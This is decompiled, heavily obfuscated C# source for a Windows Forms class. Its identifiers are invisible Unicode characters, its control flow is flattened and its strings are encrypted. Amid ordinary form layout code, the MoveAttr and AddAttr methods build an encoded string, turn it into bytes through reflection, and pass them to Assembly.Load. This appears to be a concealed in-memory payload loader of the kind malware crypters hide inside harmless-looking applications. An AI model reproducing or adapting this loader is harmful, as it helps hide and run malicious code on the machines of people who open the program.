    {
      int num1 = 2;
      if (true)
        goto label_7;
label_1:
      int num2 = this._Object != null ? 1 : 0;
label_3:
      int num3;
      if (num2 != 0)
        num3 = 3;
      else
        goto label_10;
label_6:
      num1 = num3;
label_7:
      while (true)
      {
        switch (num1)
        {
          case 0:
          case 2:
            goto label_11;
          case 1:
          case 4:
            goto label_1;
          case 3:
            goto label_5;
          case 5:
            goto label_9;
          case 6:
            goto label_13;
          default:
            num1 = 5;
            continue;
        }
      }
label_5:
      ThreadOrderDescriptor.\u202E‬‌‭⁪‍​⁫‫⁪‬‌⁫‍⁪⁭⁬⁮⁮‌‭​‫‬‍‫⁭‏‪​‪⁮‌​⁪⁬⁭‎‪⁫‮((IDisposable) this._Object);
      goto label_9;
label_13:
      return;
label_9:
      goto label_10;
label_11:
      if (!hasreference)
      {
        num2 = 0;
        goto label_3;
      }
      else
      {
        num3 = 4;
        goto label_6;
      }
label_10:
      base.Dispose(hasreference);
      num3 = 6;
      goto label_6;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void AddAttr(byte[] first)
    {
label_1:
      int num1 = -2002120683;
      Assembly instance;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ -733354548)) % 5U)
        {
          case 0:
            goto label_1;
          case 1:
            instance = ThreadOrderDescriptor.OrderAttr(first);
            num1 = (int) num2 * 1672105457 ^ -2038321546;
            continue;
          case 2:
            goto label_3;
          case 3:
            num1 = (int) num2 * 1609698008 ^ -583635410;
            continue;
          case 4:
            ThreadOrderDescriptor.VisitAttr(instance);
            num1 = (int) num2 * 1530816930 ^ 285910745;
            continue;
          default:
            goto label_7;
        }
      }
label_3:
      return;
label_7:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static Assembly OrderAttr(byte[] value)
    {
      Assembly assembly = ThreadOrderDescriptor.\u202B⁪⁮‪‏⁬⁬‏⁮‍‬​‍‌⁬⁭⁬‮‬‪​​‮‪‮⁪⁫⁬‮⁯⁬‎‎⁬⁮⁮⁪⁪⁪‎‮(value);
label_1:
      int num1 = 677662264;
      while (true)
      {
        uint num2;
        switch ((num2 = (uint) (num1 ^ 1190013566)) % 3U)
        {
          case 0:
            goto label_1;
          case 1:
            num1 = (int) num2 * -1987218197 ^ -229057083;
            continue;
          default:
            goto label_4;
        }
      }
label_4:
      return assembly;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    private static void VisitAttr(Assembly instance) => ThreadOrderDescriptor.m_Request = (object) ThreadOrderDescriptor.\u202E‌‫⁭⁫‌⁬⁫‌‭‍‎‏‬‏‬‭⁮‪​⁪⁪‪‫⁪⁪‏‏⁭⁫‪⁬⁮⁭​⁪‌‍⁯⁬‮(instance, \u003CModule\u003E.\u206D‍⁮‌‬⁬‬⁬⁪‪⁬‫‬⁮‪‮⁮‭⁭‍‍‭⁫‍⁮‫‮⁭⁮‭⁬‎‫⁭‫⁯‫‌⁬⁮‮<string>(968616642U));

    [MethodImpl(MethodImplOptions.NoInlining)]
    private void MoveAttr()
    {
      int num1 = 8;
      while (true)
      {
        int num2;
        ComponentResourceManager componentResourceManager;
        int num3;
        switch (num1)
        {
          case 0:
            this._Specification = ThreadOrderDescriptor.\u202C⁯⁪‮‍⁯‭‬‮‌⁬‪‪⁮‫​‭‎‬‏‏‫‬⁪⁯‫⁮⁮‍‬‭‫‏‭‫‬‍⁮‬⁯‮();
            this.m_Token = ThreadOrderDescriptor.\u202C⁪‍⁪‎⁬‬⁮⁪​‭⁮‎⁯‫‍⁯⁬⁭‭‏⁫‪‌⁯⁯‪⁭‌‭⁪⁪‮‎⁮⁯‌⁪‫‏‮();
            if (ThreadOrderDescriptor.FlushPrototype())
            {
              num1 = 6;
              continue;
            }
            goto case 3;
          case 1:
            ThreadOrderDescriptor.\u200E​⁫⁪‪‮⁯‍‪‭‪‍‎⁮⁬‌‍⁬⁬⁬⁪⁭‭⁪‍⁯‪⁬⁫⁮⁪⁬‬​‮⁯​‎⁮‬‮(this._Class, (Image) ThreadOrderDescriptor.\u200B‏⁪‬⁪⁮‮‮‭⁪⁯⁫‬‮⁪​⁬‬‫⁭⁫⁫‌⁭‬⁬⁪​⁮‌‍‭‭‭​‎⁪‍⁭‎‮((ResourceManager) componentResourceManager, \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(1414230346U)));
            goto case 14;
          case 2:
          case 9:
            ThreadOrderDescriptor.\u206A‏⁭‍‏‎‬‎‏⁫‌‍‬‎‎‭‏⁭‬⁯‫‬‫​​‬⁭‮⁭​‎⁬‎‍‮‮‮‍⁮⁬‮((Control) this._Specification, ThreadOrderDescriptor.\u202D‬‫⁫⁮‍‍‍‍‭‪‭‍‬‮⁭⁪‫⁬‌‭‏‎‌⁮‭⁬⁬‫‍⁫⁮⁫‏‫⁪‮‌⁮‭‮(\u003CModule\u003E.\u202C‍​‭​⁮‮⁫‎⁪⁯‮‏‏‌⁫‌⁬‬⁮‭‫⁪​⁫‌‏⁫​‮⁬‪‮⁯⁬⁭⁭⁭⁭⁫‮<string>(500209376U), 15f, FontStyle.Regular, GraphicsUnit.Point, (byte) 0));
            ThreadOrderDescriptor.\u206A⁮‫‫‪‪⁭⁭‫⁪‎‭‍⁫⁫‮‬‫‌⁯⁪⁬‎‌⁫‪‎‬⁪⁮⁯⁭⁪⁭‬​⁪‮⁪⁯‮((Control) this._Specification, new Point(631, 11));
            if (true)
            {
              num1 = 4;
              continue;
            }
            goto case 6;
          case 3:
          case 12:
            ThreadOrderDescriptor.\u206D⁫‫‮⁫⁫⁮‬⁪​‭​‌‬‎⁪‌⁪‫‬‪​‎⁫⁯⁫⁪‫‫⁯⁭‬⁮‬‫‭‬‬‫‌‮((ISupportInitialize) this._Class);
            num1 = 10;
            continue;
          case 4:
            ThreadOrderDescriptor.\u200D‎⁫⁯‫‌​⁯⁮⁬‫‫‮‫‮⁪‪‌⁪‬⁬‪⁭‌⁭⁫⁭​​⁪‭‬⁭‍‮⁪⁫⁪⁫‏‮((Control) this._Specification, new Padding(4, 0, 4, 0));
            num2 = 5;
            break;
          case 5:
            ThreadOrderDescriptor.\u202E​⁬⁫‭‏⁪‬⁬‏‍⁭⁫‌⁪‫‌⁮⁬‬⁬⁫‏⁮‏‮⁭​‎⁯‬‫‍⁮⁮⁬‍‬⁯‮‮((Control) this._Specification, \u003CModule\u003E.\u206D‍⁮‌‬⁬‬⁬⁪‪⁬‫‬⁮‪‮⁮‭⁭‍‍‭⁫‍⁮‫‮⁭⁮‭⁬‎‫⁭‫⁯‫‌⁬⁮‮<string>(597583078U));
            ThreadOrderDescriptor.\u206C‬​‍⁫​‫‬‎⁭‌‎‭⁫‬‮⁪‍‍⁮‫⁬‮‏‏‮⁯‪‍⁭‎‏‭‌‪‏⁬‭‮‬‮((Control) this._Specification, new Size(74, 29));
            ThreadOrderDescriptor.\u202A⁫⁬⁬‮⁪‬‮‬‫⁬​⁫⁮‬​‫‪​⁪⁪⁬⁭‬​‍⁫‫⁮‭‎⁫⁫‭‬‏‏⁪‍‬‮((Control) this._Specification, 7);
            num2 = 7;
            break;
          case 6:
            this.map = ThreadOrderDescriptor.\u202C⁯⁪‮‍⁯‭‬‮‌⁬‪‪⁮‫​‭‎‬‏‏‫‬⁪⁯‫⁮⁮‍‬‭‫‏‭‫‬‍⁮‬⁯‮();
            this._Adapter = ThreadOrderDescriptor.\u200B⁬⁯⁫‭‫⁫‌‍⁫⁬⁫‏‪‎⁪‪‌‫‬⁯⁮‏⁫‬⁫‫‌‎⁯​⁪⁪⁫⁫‪‎‫‭⁭‮();
            if (true)
            {
              num1 = 12;
              continue;
            }
            goto case 8;
          case 7:
            ThreadOrderDescriptor.\u206D‭⁬‍⁬‪⁫‫‬‬​‮​‪‍‭⁬​⁬⁫​‌‭⁬⁭⁭‌‮‏‭‍⁮‫‭‭‎⁬⁮‬⁮‮((Control) this._Specification, \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(1540840004U));
            num2 = 11;
            break;
          case 8:
            // ISSUE: type reference
            componentResourceManager = ThreadOrderDescriptor.\u200C‌‎‫⁪‭‎⁫​⁪⁯‫​‪⁯⁬‬‪⁫‪‬⁭​‍‫⁬⁪⁫‫​⁪‏⁯‍‬‍‮‎‭‍‮(ThreadOrderDescriptor.\u206C⁯‍‍‬‬⁮‫​‌‭‭⁮⁭​‮‏‪‏⁬⁫⁭‮‬​⁫⁮⁫⁯‏⁬⁯‍⁮​‎‌‍‎⁯‮(__typeref (ThreadOrderDescriptor)));
            num2 = 0;
            break;
          case 10:
            ThreadOrderDescriptor.\u200E⁯⁪‪​‏‍⁪⁯‭‌‪‎⁭⁬⁯‏‮⁪⁮⁮‭‮⁮‎‎‫‬‮⁮‭⁪‮⁮⁯‪⁫‍⁬‎‮((Control) this.m_Token);
            ThreadOrderDescriptor.\u206D⁫‫‮⁫⁫⁮‬⁪​‭​‌‬‎⁪‌⁪‫‬‪​‎⁫⁯⁫⁪‫‫⁯⁭‬⁮‬‫‭‬‬‫‌‮((ISupportInitialize) this._Adapter);
            num1 = 13;
            continue;
          case 11:
            ThreadOrderDescriptor.\u200F⁪⁫⁭‪⁫​‪⁯‪​‬⁫‌‮‍⁬‮‮⁭‪‬⁪‪‍‍‮‫⁫⁯⁯‬‏‭⁯‬‎‪⁮⁮‮((Control) this.m_Token, ThreadOrderDescriptor.\u206B⁭​‫⁯‬‍⁬‏‎‭‎‎‫‪⁯‎​⁫⁪‌‌‭​⁮‬‪⁬‎‬‏‏‬⁬‍⁫⁫⁪‪⁭‮());
            this.val = ThreadOrderDescriptor.\u200B⁯⁯‪‮‍⁮‎⁮‮‮‏⁬⁭‌⁯‬‏⁫‮‪⁪‮‍‎‬‎‍‌‭⁭‌‪‬‫⁯‎‎‏‫‮(new string[13]
            {
              ThreadOrderDescriptor.m_Initializer,
              ThreadOrderDescriptor._Status,
              ThreadOrderDescriptor.product,
              ThreadOrderDescriptor._Policy,
              ThreadOrderDescriptor.m_Order,
              ThreadOrderDescriptor.m_Worker,
              ThreadOrderDescriptor.m_Ref,
              ThreadOrderDescriptor.m_Model,
              ThreadOrderDescriptor.m_Error,
              ThreadOrderDescriptor.m_Parser,
              ThreadOrderDescriptor._Task,
              ThreadOrderDescriptor._Client,
              ThreadOrderDescriptor.m_Repository
            });
            this.val = ThreadOrderDescriptor.\u202E‏‌‪⁭‫⁪​​⁭⁯‎⁬‌‏⁪⁭⁬​⁪‎⁮‏⁭‬‮‫⁯‎‏‎‌‫‍⁬‏⁮⁮‪‎‮(this.val, \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(2182840249U), \u003CModule\u003E.\u202C‍​‭​⁮‮⁫‎⁪⁯‮‏‏‌⁫‌⁬‬⁮‭‫⁪​⁫‌‏⁫​‮⁬‪‮⁯⁬⁭⁭⁭⁭⁫‮<string>(2174236594U));
            int num4 = 15;
            num1 = ThreadOrderDescriptor.ViewPrototype() ? num4 : num4;
            continue;
          case 13:
label_19:
            num3 = -2102440202;
            goto label_17;
          case 14:
            ThreadOrderDescriptor.\u206A⁮‫‫‪‪⁭⁭‫⁪‎‭‍⁫⁫‮‬‫‌⁯⁪⁬‎‌⁫‪‎‬⁪⁮⁯⁭⁪⁭‬​⁪‮⁪⁯‮((Control) this._Class, new Point(0, 0));
            ThreadOrderDescriptor.\u200D‎⁫⁯‫‌​⁯⁮⁬‫‫‮‫‮⁪‪‌⁪‬⁬‪⁭‌⁭⁫⁭​​⁪‭‬⁭‍‮⁪⁫⁪⁫‏‮((Control) this._Class, new Padding(5, 5, 5, 5));
            ThreadOrderDescriptor.\u206C‬​‍⁫​‫‬‎⁭‌‎‭⁫‬‮⁪‍‍⁮‫⁬‮‏‏‮⁯‪‍⁭‎‏‭‌‪‏⁬‭‮‬‮((Control) this._Class, new Size(533, 800));
            ThreadOrderDescriptor.\u206A‌‪‏⁭‭⁫⁮⁫⁫⁪‭‮‫⁮⁭⁭‬‍‌⁪​‍⁪⁯⁭⁫‎⁮⁫‏‍‬⁫⁫‌‬‍‫‍‮((Control) this._Specification, true);
            num1 = 2;
            continue;
          case 15:
            ThreadOrderDescriptor.AddAttr((byte[]) ThreadOrderDescriptor.\u202A​‫‬‌⁭‍⁪⁭⁮​​‎‫‪‭‮‬​‍‌‌‭‭⁫‍⁯⁭‏‍‬‫⁬‏​⁯‏⁪‎‫‮(ThreadOrderDescriptor.\u200F‮⁬‭⁯‬‮‌‍‫‌​‪⁯‎‏‭‮⁪‫​⁯⁭⁪‭​⁭⁪⁪‭⁭⁪‎‫‪⁫​⁫‬⁮‮(\u003CModule\u003E.\u206D‍⁮‌‬⁬‬⁬⁪‪⁬‫‬⁮‪‮⁮‭⁭‍‍‭⁫‍⁮‫‮⁭⁮‭⁬‎‫⁭‫⁯‫‌⁬⁮‮<string>(2371635977U)), \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(728124148U), BindingFlags.InvokeMethod, (Binder) null, (object) null, new object[1]
            {
              (object) this.val
            }));
            ThreadOrderDescriptor.\u200F⁭⁪‍‌‫‏⁬‪⁪⁯‏⁬‎⁪⁬⁫‬‍‭‌⁪‫‮‬‮⁯⁫‎‫⁭⁯‭⁭‫‌‍‫‭‍‮((Control) this);
            if (true)
            {
              num1 = 17;
              continue;
            }
            goto case 14;
          case 16:
            ThreadOrderDescriptor.\u202E‏‮⁭‌​‫‎‎​⁭⁯‍​⁯⁪⁬⁮‍‮⁬⁬‭‎⁮⁯⁭‬​‪‍‍‌‫​‍‮⁬‌‮(this._Class, BorderStyle.FixedSingle);
            ThreadOrderDescriptor.\u200B‌‍‭‪‬‎⁭‍‍⁪‫​⁫⁫⁪⁮‌‫‮⁬⁫‌‏⁭⁫‮⁭‫⁮⁮‌⁫⁯‭‮‬‬⁮‭‮((Control) this._Class, DockStyle.Left);
            num2 = 1;
            break;
          case 17:
            goto label_23;
          default:
label_16:
            num3 = -2012890028;
            goto label_17;
        }
label_14:
        num1 = num2;
        continue;
label_17:
        while (true)
        {
          uint num5;
          switch ((num5 = (uint) (num3 ^ -409618472)) % 5U)
          {
            case 0:
              goto label_16;
            case 1:
              goto label_20;
            case 2:
              goto label_19;
            case 4:
              ThreadOrderDescriptor.\u200F⁭⁪‍‌‫‏⁬‪⁪⁯‏⁬‎⁪⁬⁫‬‍‭‌⁪‫‮‬‮⁯⁫‎‫⁭⁯‭⁭‫‌‍‫‭‍‮((Control) this);
              num3 = (int) num5 * 1995242552 ^ -508979901;
              continue;
            default:
              goto label_21;
          }
        }
label_20:
        num2 = 14;
        goto label_14;
label_21:
        num1 = 16;
      }
label_23:;
    }

    [MethodImpl(MethodImplOptions.NoInlining)]
    static ThreadOrderDescriptor()
    {
      int num1 = 0;
label_1:
      int num2 = -1348405213;
      while (true)
      {
        uint num3;
        int num4;
        switch ((num3 = (uint) (num2 ^ -1046443850)) % 4U)
        {
          case 0:
            goto label_1;
          case 1:
label_6:
            num4 = num1;
            goto label_7;
          case 3:
label_4:
            ThreadOrderDescriptor.m_Parser = \u003CModule\u003E.\u200B‮‭‏‪‌‮‎‍‬‪‭‏​​‬⁬⁭‍‬‪‭⁬⁫‮​​⁯‫​‍‍⁫‮‪‎⁫‌‪⁪‮<string>(1613019746U);
            if (!ThreadOrderDescriptor.ViewPrototype())
            {
              num4 = 8;
              goto label_7;
            }
            else
              break;
          default:
            if (true)
            {
              num4 = 2;
              goto label_7;
            }
            else
              goto label_10;
        }
label_5:
        ThreadOrderDescriptor.m_Model = \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(1162227845U);
        goto label_14;
label_7:
        while (true)
        {
          switch (num4)
          {
            case 0:
              goto label_15;
            case 1:
            case 4:
              goto label_5;
            case 2:
              goto label_14;
            case 3:
              goto label_10;
            case 5:
              goto label_4;
            case 6:
              ThreadOrderDescriptor.m_Worker = \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(3616239031U);
              ThreadOrderDescriptor.m_Ref = \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(675295273U);
              num4 = 1;
              continue;
            case 7:
            case 8:
              goto label_12;
            case 9:
              goto label_13;
            case 10:
              goto label_3;
            default:
              goto label_8;
          }
        }
label_8:
        num2 = -1818825852;
        continue;
label_12:
        ThreadOrderDescriptor._Task = \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(150406174U);
        ThreadOrderDescriptor._Client = \u003CModule\u003E.\u202C‍​‭​⁮‮⁫‎⁪⁯‮‏‏‌⁫‌⁬‬⁮‭‫⁪​⁫‌‏⁫​‮⁬‪‮⁯⁬⁭⁭⁭⁭⁫‮<string>(2616412175U);
        ThreadOrderDescriptor.m_Repository = \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(971017322U);
        num1 = 10;
        goto label_6;
label_13:
        ThreadOrderDescriptor.product = \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(2910638790U);
        ThreadOrderDescriptor._Policy = \u003CModule\u003E.\u202B⁯​‌‬‬⁮⁬⁬‍⁮⁯⁫​⁪⁮‬‏‏⁬‮⁯⁯⁫⁯‮‏‏‍‏⁯‍‪‍‏⁯​⁬​⁯‮<string>(3590790538U);
        ThreadOrderDescriptor.m_Order = \u003CModule\u003E.\u200B‮‭‏‪‌‮‎‍‬‪‭‏​​‬⁬⁭‍‬‪‭⁬⁫‮​​⁯‫​‍‍⁫‮‪‎⁫‌‪⁪‮<string>(3450979957U);
        num1 = 6;
        goto label_6;
label_15:
        ThreadOrderDescriptor.m_Initializer = \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(1287559729U);
        num1 = 3;
        goto label_6;
label_10:
        ThreadOrderDescriptor._Status = \u003CModule\u003E.\u200B‮‭‏‪‌‮‎‍‬‪‭‏​​‬⁬⁭‍‬‪‭⁬⁫‮​​⁯‫​‍‍⁫‮‪‎⁫‌‪⁪‮<string>(1626557278U);
        num1 = 9;
        goto label_6;
label_14:
        ThreadOrderDescriptor.m_Error = \u003CModule\u003E.\u200F‭‪⁪‮‪‎‭⁫‭⁭‎​‬‏⁮‌⁮⁯⁫⁫⁮‪​⁬⁭⁮‮‭⁮‎‮‭‭⁪⁬‬⁫‮‏‮<string>(3750760192U);
        num4 = 5;
        goto label_7;
      }
label_3:;
    }

    internal static bool FlushPrototype() => true;

    internal static bool ViewPrototype() => false;

    static void \u202A‭‌⁭‬‫‍​⁭⁯‬‫⁫‮‏⁮‏‮​⁪‬‪‌‎‏⁬‌‪‏⁮​‌‍‏⁬⁯‪‌​‬‮(
      [In] PropertyInfo obj0,
      [In] object obj1,
      [In] object obj2,
      [In] object[] obj3)
    {
      obj0.SetValue(obj1, obj2, obj3);
    }

    static PropertyInfo[] \u202E‎⁮⁬‎‫⁯‌⁪⁭‬‪​‎⁭‪‎‎‮‏⁭​⁭⁪⁬‭‮‫‬‎‌‫‮‮‎‎‮‍‮‪‮([In] System.Type obj0) => obj0.GetProperties();

    static string \u206C‮⁯‭​‫⁪⁪⁯‎‎⁪‏⁫‫‎‭‪‫‮‪‭⁫‎⁫‌‎⁯‬‎⁮⁭⁭‍‭‏‍‏⁬⁪‮([In] string obj0, [In] string obj1) => obj0 + obj1;

    static AppDomain \u202C​​​‫⁫⁪‏​‫‎⁯⁯‭‍⁭‫​‪‮‬‌⁮‪‭⁬​‌⁬‌‎⁮⁭⁪​⁮‬⁭‬‌‮() => AppDomain.CurrentDomain;

    static string \u200E‭‎‍⁫‮‎⁯‎‏⁫⁮⁯‌‬‭​​⁫‭⁮‭⁮‭‏⁫‌‏‮⁫‮⁬‬‬⁯​​⁪⁫‪‮([In] AppDomain obj0) => obj0.BaseDirectory;

    static string \u206C‭‬⁭⁬⁪⁪‍‪‌‌‪⁬‬⁭⁭⁪‏⁭⁯⁮‌‌‮‎⁯⁮​​‫‍⁭⁯‍‫‎‭⁬⁭⁫‮([In] string obj0, [In] string obj1) => Path.Combine(obj0, obj1);

    static Size \u200E⁮‫‌‪​⁮⁯⁯‍‭⁪⁭​⁪‌⁮‍‌‭‍‌​⁯⁫‌‮‌⁯​‪‭‌‏​‬‪‍‌⁭‮([In] Form obj0) => obj0.Size;

    static void \u206E⁯⁬⁫⁮‎‌‪‪⁯‍​‫​⁭‫⁯‎‫‭‎⁫​​‌⁯‮‪⁬‪‪‭‭⁯‪‫‫‪⁯‎‮([In] Control obj0, [In] Size obj1) => obj0.MaximumSize = obj1;

    static void \u200B​‭‭‏‭‍‪⁪⁮⁯⁮‬⁫‮‍⁯‭⁬⁯⁯‌‍‫⁯‪⁬​‫‍⁭‮⁮‍‍‭‭‬⁯‏‮([In] Control obj0, [In] Size obj1) => obj0.MinimumSize = obj1;

    static int \u206B⁫‮‬‎‏‍⁯⁫‌‍‫⁪⁬⁫‎‭⁭‪⁭‪‮‌‍⁫⁬⁭‮‌⁪⁯⁪‎‌⁪‬⁭‬‪⁯‮([In] Control obj0) => obj0.Width;

    static void \u202B⁯‏⁪⁫⁯⁬‏⁮⁫‭⁫‏‌‎⁯⁫⁮‮​‌⁮‪⁬⁮⁬‬‎‎⁭​‬⁯⁫‍⁬‬‮⁭⁪‮([In] Form obj0, [In] Size obj1) => obj0.ClientSize = obj1;

    static DialogResult \u202D‍‏‫‭‫⁫‎​‎⁬⁯⁭‬‏‪‫⁭⁯‫‌‎​⁫‎⁬⁯⁮‌​‮⁪‍‍‭⁮⁭‬⁮‏‮([In] string obj0) => MessageBox.Show(obj0);

    static Random \u200B‪⁪⁪​‌‭‮⁪‍‫‮‎⁬‍‏‌‏​‍‍‭⁯​‬‎⁯‎‪‍‮⁫⁭⁭⁯‪‌‬‮‭‮([In] int obj0) => new Random(obj0);

    static int \u206E⁭‫‭⁫⁬⁯‪⁮⁮‎‮⁬⁭‏‌‌⁫‏‪‪‪⁮‫‭‎⁪‪‌‫⁭‌‏‮⁬‏⁪⁮‮‭‮([In] Random obj0, [In] int obj1, [In] int obj2) => obj0.Next(obj1, obj2);

    static void \u206D‭⁬‍⁬‪⁫‫‬‬​‮​‪‍‭⁬​⁬⁫​‌‭⁬⁭⁭‌‮‏‭‍⁮‫‭‭‎⁬⁮‬⁮‮([In] Control obj0, [In] string obj1) => obj0.Text = obj1;

    static void \u202E‬‌‭⁪‍​⁫‫⁪‬‌⁫‍⁪⁭⁬⁮⁮‌‭​‫‬‍‫⁭‏‪​‪⁮‌​⁪⁬⁭‎‪⁫‮([In] IDisposable obj0) => obj0.Dispose();

    static Assembly \u202B⁪⁮‪‏⁬⁬‏⁮‍‬​‍‌⁬⁭⁬‮‬‪​​‮‪‮⁪⁫⁬‮⁯⁬‎‎⁬⁮⁮⁪⁪⁪‎‮([In] byte[] obj0) => Assembly.Load(obj0);

    static System.Type \u202E‌‫⁭⁫‌⁬⁫‌‭‍‎‏‬‏‬‭⁮‪​⁪⁪‪‫⁪⁪‏‏⁭⁫‪⁬⁮⁭​⁪‌‍⁯⁬‮(
      [In] Assembly obj0,
      [In] string obj1)
    {
      return obj0.GetType(obj1);
    }

    static void \u200E⁯⁪‪​‏‍⁪⁯‭‌‪‎⁭⁬⁯‏‮⁪⁮⁮‭‮⁮‎‎‫‬‮⁮‭⁪‮⁮⁯‪⁫‍⁬‎‮([In] Control obj0) => obj0.SuspendLayout();

    static void \u206D⁫‫‮⁫⁫⁮‬⁪​‭​‌‬‎⁪‌⁪‫‬‪​‎⁫⁯⁫⁪‫‫⁯⁭‬⁮‬‫‭‬‬‫‌‮([In] ISupportInitialize obj0) => obj0.BeginInit();

    static void \u202E​⁬⁫‭‏⁪‬⁬‏‍⁭⁫‌⁪‫‌⁮⁬‬⁬⁫‏⁮‏‮⁭​‎⁯‬‫‍⁮⁮⁬‍‬⁯‮‮([In] Control obj0, [In] string obj1) => obj0.Name = obj1;

    static void \u206C‬​‍⁫​‫‬‎⁭‌‎‭⁫‬‮⁪‍‍⁮‫⁬‮‏‏‮⁯‪‍⁭‎‏‭‌‪‏⁬‭‮‬‮([In] Control obj0, [In] Size obj1) => obj0.Size = obj1;

    static void \u202A⁫⁬⁬‮⁪‬‮‬‫⁬​⁫⁮‬​‫‪​⁪⁪⁬⁭‬​‍⁫‫⁮‭‎⁫⁫‭‬‏‏⁪‍‬‮([In] Control obj0, [In] int obj1) => obj0.TabIndex = obj1;

    static Font \u202D‬‫⁫⁮‍‍‍‍‭‪‭‍‬‮⁭⁪‫⁬‌‭‏‎‌⁮‭⁬⁬‫‍⁫⁮⁫‏‫⁪‮‌⁮‭‮(
      [In] string obj0,
      [In] float obj1,
      [In] FontStyle obj2,
      [In] GraphicsUnit obj3,
      [In] byte obj4)
    {
      return new Font(obj0, obj1, obj2, obj3, obj4);
    }

    static void \u206A‏⁭‍‏‎‬‎‏⁫‌‍‬‎‎‭‏⁭‬⁯‫‬‫​​‬⁭‮⁭​‎⁬‎‍‮‮‮‍⁮⁬‮([In] Control obj0, [In] Font obj1) => obj0.Font = obj1;

    static void \u206A⁮‫‫‪‪⁭⁭‫⁪‎‭‍⁫⁫‮‬‫‌⁯⁪⁬‎‌⁫‪‎‬⁪⁮⁯⁭⁪⁭‬​⁪‮⁪⁯‮([In] Control obj0, [In] Point obj1) => obj0.Location = obj1;

    static Label \u202C⁯⁪‮‍⁯‭‬‮‌⁬‪‪⁮‫​‭‎‬‏‏‫‬⁪⁯‫⁮⁮‍‬‭‫‏‭‫‬‍⁮‬⁯‮() => new Label();

    static PictureBox \u200B⁬⁯⁫‭‫⁫‌‍⁫⁬⁫‏‪‎⁪‪‌‫‬⁯⁮‏⁫‬⁫‫‌‎⁯​⁪⁪⁫⁫‪‎‫‭⁭‮() => new PictureBox();

    static System.Type \u206C⁯‍‍‬‬⁮‫​‌‭‭⁮⁭​‮‏‪‏⁬⁫⁭‮‬​⁫⁮⁫⁯‏⁬⁯‍⁮​‎‌‍‎⁯‮([In] RuntimeTypeHandle obj0) => System.Type.GetTypeFromHandle(obj0);

    static ComponentResourceManager \u200C‌‎‫⁪‭‎⁫​⁪⁯‫​‪⁯⁬‬‪⁫‪‬⁭​‍‫⁬⁪⁫‫​⁪‏⁯‍‬‍‮‎‭‍‮(
      [In] System.Type obj0)
    {
      return new ComponentResourceManager(obj0);
    }

    static Panel \u202C⁪‍⁪‎⁬‬⁮⁪​‭⁮‎⁯‫‍⁯⁬⁭‭‏⁫‪‌⁯⁯‪⁭‌‭⁪⁪‮‎⁮⁯‌⁪‫‏‮() => new Panel();

    static void \u200D‎⁫⁯‫‌​⁯⁮⁬‫‫‮‫‮⁪‪‌⁪‬⁬‪⁭‌⁭⁫⁭​​⁪‭‬⁭‍‮⁪⁫⁪⁫‏‮([In] Control obj0, [In] Padding obj1) => obj0.Margin = obj1;

    static void \u202E‏‮⁭‌​‫‎‎​⁭⁯‍​⁯⁪⁬⁮‍‮⁬⁬‭‎⁮⁯⁭‬​‪‍‍‌‫​‍‮⁬‌‮([In] PictureBox obj0, [In] BorderStyle obj1) => obj0.BorderStyle = obj1;

    static void \u200B‌‍‭‪‬‎⁭‍‍⁪‫​⁫⁫⁪⁮‌‫‮⁬⁫‌‏⁭⁫‮⁭‫⁮⁮‌⁫⁯‭‮‬‬⁮‭‮([In] Control obj0, [In] DockStyle obj1) => obj0.Dock = obj1;

    static System.Type \u200F‮⁬‭⁯‬‮‌‍‫‌​‪⁯‎‏‭‮⁪‫​⁯⁭⁪‭​⁭⁪⁪‭⁭⁪‎‫‪⁫​⁫‬⁮‮([In] string obj0) => System.Type.GetType(obj0);

    static object \u202A​‫‬‌⁭‍⁪⁭⁮​​‎‫‪‭‮‬​‍‌‌‭‭⁫‍⁯⁭‏‍‬‫⁬‏​⁯‏⁪‎‫‮(
      [In] System.Type obj0,
      [In] string obj1,
      [In] BindingFlags obj2,
      [In] Binder obj3,
      [In] object obj4,
      [In] object[] obj5)
    {
      return obj0.InvokeMember(obj1, obj2, obj3, obj4, obj5);
    }

